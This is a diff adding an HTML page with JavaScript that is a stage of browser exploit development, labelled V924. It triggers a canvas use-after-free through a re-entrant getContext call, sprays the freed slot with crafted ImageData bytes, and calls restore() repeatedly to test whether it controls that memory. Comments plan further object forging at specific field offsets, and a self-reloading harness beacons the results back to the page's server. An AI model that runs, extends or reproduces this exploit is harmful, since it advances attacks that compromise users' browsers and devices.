@@ -1,0 +1,172 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="20;url=/"><title>V924</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div><script>
+// V924 -- THE DISCRIMINATOR. One triggerUAF. Answers the only question V923 could not:
+// when restore() returns, did OUR bytes take the slot, or did a live CRC2D?
+//
+// THE CONFOUND IN V923 (state it plainly, it is not a small one)
+//   plantCSS() calls document.getCSSCanvasContext('2d',name,16,h). That allocates THREE things per
+//   iteration: an off-DOM HTMLCanvasElement, a CanvasRenderingContext2D OBJECT (~896 bytes, the exact
+//   class that survived), and an ImageBuffer whose pixel store is our payload. 896=LAND therefore has
+//   two candidate winners and V923 could not tell them apart. Both return from restore().
+//
+// THE TEST: call restore() more than once.
+//   restore() (:459) = if (m_unrealizedSaveCount) { --m_unrealizedSaveCount; return; }
+//                      ASSERT(size >= 1); if (size <= 1) return; m_path.transform(m_stateStack.last()...)
+//   OUR PAYLOAD in the slot: byte 592 = 0x01 -> call 1 decrements it to 0 and returns; call 2 finds 0,
+//     falls through to m_stateStack, whose size field is our 0x41414141 -> dereferences garbage -> DIES.
+//   A LIVE CRC2D in the slot: saveCount 0, stateStack size 1 -> call 1, 2, 3 all return forever.
+// So the death is the signal, and the count is the proof. Garbage cannot count to two.
+//
+// PRE-REGISTERED INTERPRETATION (fixed before any result)
+//   r1 returned, r2 DIED                 -> BYTE CONTROL PROVEN at slot+0. Our ImageBuffer pixel store
+//                                           occupied the freed CRC2D slot. The forge resumes: +28
+//                                           CallTracer zero, +32 m_canvas, +112/+120 m_stateStack.
+//   r1 returned, r2 returned, r3 returned -> same-type reclaim only. Our bytes are NOT in the slot;
+//                                           the winner was the CRC2D object plantCSS also created.
+//                                           V923's LAND must then be withdrawn as confounded.
+//   r1 DIED                              -> not landed at this length at all.
+//   mode=ctl r1/r2/r3 must ALL return    -> if ctl dies on r2, the discriminator itself is broken and
+//                                           no css line from this session is interpretable.
+//
+// NUMBERS: L=896 is the only length that landed in V923 (768 died). 16 x 14 x 4 = 896.
+var PRE='V924',B=1,LOG=document.getElementById('log');
+var PT=String(Date.now());
+var MODE=(/[?&]m=(\w+)/.exec(location.search)||[,'css'])[1];
+var L=896, LH=14;                       // 16*14*4 = 896
+var J='v924j_'+MODE;                    // per-mode journal on purpose
+
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(stg,stage,d){var s=('000'+B).slice(-3);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+stg+'-'+stage+'?d='+encodeURIComponent(String(d==null?'':d))+'&pt='+PT+'&t='+Date.now();
+ Lg(s+' '+stg+' '+stage+' '+d);
+ try{if(navigator.sendBeacon){navigator.sendBeacon(path);}}catch(e){}
+ try{new Image().src=path;}catch(e){}
+ try{new Image().src=path+'&k=3';}catch(e){}
+}
+var BI=1200;var pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+window.addEventListener('error',function(e){bea('FAIL','JSERR',(e.message||'')+'|L'+e.lineno);});
+function after(ms,fn){setTimeout(fn,ms);}
+
+// ---------- ZERO-TOUCH HARNESS ----------
+// advances the queue itself: no operator reload, no 45s wait, and a probe that keeps dying cannot
+// stall the rotation (3 deaths on the same url = give up and move on).
+var HK='v924h_'+MODE,DONE=false;
+var h=null;try{h=JSON.parse(localStorage.getItem(HK)||'null');}catch(e){h=null;}
+if(!h)h={runs:0,deaths:0};
+function hs(){try{localStorage.setItem(HK,JSON.stringify(h));}catch(e){}}
+function goHome(){location.replace('/');}
+function hstage(s){h.stage=s;hs();}
+if(h.pending){
+ h.deaths++;h.pending=0;hs();
+ bea('PASS','RECOVER-H','prev-run='+h.runs+'|died-at='+(h.stage||'?')+'|deaths='+h.deaths);
+ if(h.deaths>=3){bea('FAIL','GIVEUP','probe='+PRE+'|mode='+MODE+'|deaths='+h.deaths);DONE=true;goHome();}
+}
+h.runs++;h.pending=1;h.stage='boot';hs();
+var wd=setTimeout(function(){if(!DONE){var st=h.stage;DONE=true;h.pending=0;hs();bea('FAIL','WATCHDOG','stuck-at='+st+'|advancing');goHome();}},9000);
+
+
+var prev=null;
+try{prev=JSON.parse(localStorage.getItem(J)||'null');}catch(e){prev=null;}
+if(prev&&prev.runs){
+ bea('PASS','RECOVER','prev='+prev.runs+'|mode='+prev.mode+'|len='+prev.len+'|stage='+prev.stage+'|note='+(prev.note||''));
+ // derive the death point of the previous run -- this IS the measurement
+ var d='';
+ if(prev.stage==='pre-r1')d='DIED-IN-CALL-1|not-landed';
+ else if(prev.stage==='pre-r2')d='DIED-IN-CALL-2|BYTE-CONTROL';
+ else if(prev.stage==='pre-r3')d='DIED-IN-CALL-3|unexpected';
+ else if(prev.stage==='r3-done')d='SURVIVED-3|same-type-only';
+ if(d)bea('PASS','ANALYSIS','prev-stage='+prev.stage+'|'+d+'|mode='+prev.mode+'|len='+prev.len);
+}
+var runs=(prev&&prev.mode===MODE)?(prev.runs+1):1;
+var j={runs:runs,mode:MODE,len:L,stage:'boot',note:''};
+function save(){try{localStorage.setItem(J,JSON.stringify(j));}catch(e){}}
+save();
+
+var inner=null,keep=[];
+function plantCSS(){
+ var made=0;
+ for(var n=0;n<32;n++){
+  var name='d'+PT+'_'+runs+'_'+n, ctx=null;
+  try{ctx=document.getCSSCanvasContext('2d',name,16,LH);}catch(e){ctx=null;}
+  if(!ctx)continue;
+  var img=ctx.createImageData(16,LH), d=img.data;
+  for(var k=0;k<d.length;k++)d[k]=0x41;
+  for(var k=3;k<d.length;k+=4)d[k]=0xFF;   // opaque -> premultiplication is identity
+  d[592]=0x01;                              // slot+592 = m_unrealizedSaveCount
+  try{ctx.putImageData(img,0,0);}catch(e){}
+  keep.push(ctx);made++;
+ }
+ return made;
+}
+function plantCtl(){
+ for(var i=0;i<32;i++){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  document.body.appendChild(c);keep.push(c.getContext('2d'));
+ }
+ return keep.length;
+}
+
+try{
+ bea('PASS','PLAN','PT='+PT+'|mode='+MODE+'|len='+L+'|runs='+runs+'|test=double-restore');
+ bea('ENTER','S0','v924|nam='+MODE+'|len='+L+'|PT='+PT+'|run='+runs);
+ for(var i=0;i<400;i++){var a=new Array(32);a[0]=i;a=null;}
+ try{var big=new ArrayBuffer(131072);big=null;}catch(e){}
+ bea('PASS','S2','PT='+PT+'|churn');
+
+ var outer=document.createElement('canvas');outer.width=1;outer.height=1;
+ document.body.appendChild(outer);
+ var desc={};
+ Object.defineProperty(desc,'alpha',{get:function(){
+  bea('ENTER','GET-IN','PT='+PT+'|creating-2d');
+  inner=outer.getContext('2d');
+  bea('ENTER','GET-MID','PT='+PT+'|inner='+(inner?'yes':'no'));
+  try{inner.setLineDash([7,7]);}catch(e){}
+  bea('ENTER','GET-OUT','PT='+PT+'|marker-set');
+  return true;},configurable:true});
+
+ bea('ENTER','S3','PT='+PT+'|about-to-trigger');
+ after(400,function(){
+  j.stage='trigger'; save();
+  var threw='';
+  try{outer.getContext('bitmaprenderer',desc);}catch(e){threw=String(e&&e.message||e);}
+  j.stage='post-trigger'; if(threw)j.note='threw='+threw; save();
+  bea('PASS','S3','PT='+PT+'|trigger-returned|'+(threw?'threw':'clean'));
+  if(!inner){j.note='no-handle';save();bea('FAIL','VERDICT','PT='+PT+'|NO-HANDLE');return;}
+
+  j.stage='plant-pre'; save();
+  var n=(MODE==='ctl')?plantCtl():plantCSS();
+  j.stage='plant-done';j.note='planted='+n; save();
+  bea('PASS','PLANT','PT='+PT+'|mode='+MODE+'|len='+L+'|n='+n);
+
+  // call 1
+  j.stage='pre-r1'; save();
+  bea('ENTER','R1','PT='+PT+'|about-to-call|mode='+MODE);
+  var r1=(function(){try{inner.restore();return 'returned';}catch(e){return 'THREW';}})();
+  j.stage='r1-done';j.note='r1='+r1; save();
+  bea('PASS','R1','PT='+PT+'|'+r1+'|mode='+MODE);
+
+  // call 2 -- the measurement
+  j.stage='pre-r2'; save();
+  bea('ENTER','R2','PT='+PT+'|about-to-call|r1='+r1+'|mode='+MODE);
+  var r2=(function(){try{inner.restore();return 'returned';}catch(e){return 'THREW';}})();
+  j.stage='r2-done';j.note='r1='+r1+'|r2='+r2; save();
+  bea('PASS','R2','PT='+PT+'|'+r2+'|mode='+MODE);
+
+  // call 3 -- only to separate "live context, keeps returning" from "one-shot counter"
+  j.stage='pre-r3'; save();
+  bea('ENTER','R3','PT='+PT+'|about-to-call|mode='+MODE);
+  var r3=(function(){try{inner.restore();return 'returned';}catch(e){return 'THREW';}})();
+  j.stage='r3-done';j.note='r1='+r1+'|r2='+r2+'|r3='+r3; save();
+  bea('PASS','R3','PT='+PT+'|'+r3+'|mode='+MODE);
+
+  if(MODE==='ctl'){
+   var ok=(r1==='returned'&&r2==='returned'&&r3==='returned');
+   bea(ok?'PASS':'FAIL','CONTROL','PT='+PT+'|'+(ok?'DISCRIMINATOR-VALID|ctl-survives-3':'DISCRIMINATOR-BROKEN|ctl-died'));
+  }
+  bea('PASS','S9','PT='+PT+'|DONE|mode='+MODE+'|r='+r1+'/'+r2+'/'+r3);
+  DONE=true;h.pending=0;h.stage='done';hs();clearTimeout(wd);
+  setTimeout(goHome,600);
+ });
+}catch(e){if(e)bea('FAIL','FATAL',String(e&&e.message||e));}
+</script></body></html>
